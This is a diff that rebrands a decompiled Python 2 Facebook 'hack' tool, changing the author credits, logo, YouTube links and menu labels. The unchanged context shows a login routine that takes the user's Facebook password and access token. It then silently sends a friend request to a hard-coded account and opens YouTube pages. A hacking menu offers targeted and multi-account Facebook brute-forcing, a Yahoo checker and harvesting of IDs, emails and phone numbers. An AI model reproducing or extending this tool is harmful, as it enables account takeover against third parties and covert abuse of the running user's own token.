@@ -1,4 +1,4 @@
-#Decompiled by MR.K7C8NG
+#Decompiled by Shymon Hasan
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -23,7 +23,7 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMR.K7C8NG\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mInDoNeSiA CYBER ErRoR SyStEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mGUNAKAN DENGAN BIJAK \x1b[1;97m/ \x1b[1;96mMR.K7C8NG\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/pashayogi\x1b[0m\n[*] Decompiled by MR.K7C8NG\n'
+logo = '?????????? ??????????\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mShymon-Hasan\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mFacebook \x1b[1;91m: \x1b[1;96mI.FueK.YoUr.MiNd.BnXDm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mYoutube \x1b[1;97m/ \x1b[1;96mFeelings Creation\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/ShymonHasan\x1b[0m\n[*] Decompiled by ShymonHasan\n'
 
 def tik():
     titik = [
@@ -65,7 +65,7 @@ def login():
         os.system('clear')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN Any Facebook Account SH \x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                os.system('xdg-open https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -151,7 +151,7 @@ def menu():
     print '\x1b[1;37;40m2. Hack Akun Facebook'
     print '\x1b[1;37;40m3. Bot               '
     print '\x1b[1;37;40m4. Lainnya....       '
-    print '\x1b[1;37;40m5. LogOut            '
+    print '\x1b[1;37;40m5. LogOut  SH        '
     print '\x1b[1;31;40m0. Keluar            '
     print
     pilih()
@@ -177,7 +177,7 @@ def pilih():
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open https://www.youtube.com/nganunymous')
+                            os.system('xdg-open https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ')
                             keluar()
                         else:
                             if zedd == '0':
@@ -271,13 +271,13 @@ def menu_hack():
     os.system('clear')
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
-    print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
-    print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook'
-    print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
-    print '\x1b[1;37;40m5. Yahoo Checker'
-    print '\x1b[1;37;40m6. Ambil id/email/hp'
-    print '\x1b[1;31;40m0. Kembali'
+    print '\x1b[1;37;40m1. Mini Hack Facebook SH(\x1b[1;92mTarget\x1b[1;97m)'
+    print '\x1b[1;37;40m2. Multi Bruteforce Facebook SH'
+    print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook SH'
+    print '\x1b[1;37;40m4. BruteForce SH(\x1b[1;92mTarget\x1b[1;97m)'
+    print '\x1b[1;37;40m5. Yahoo Checker SH'
+    print '\x1b[1;37;40m6. Ambil id/email/hp SH'
+    print '\x1b[1;31;40m0. Kembali SH'
     print
     hack_pilih()
 
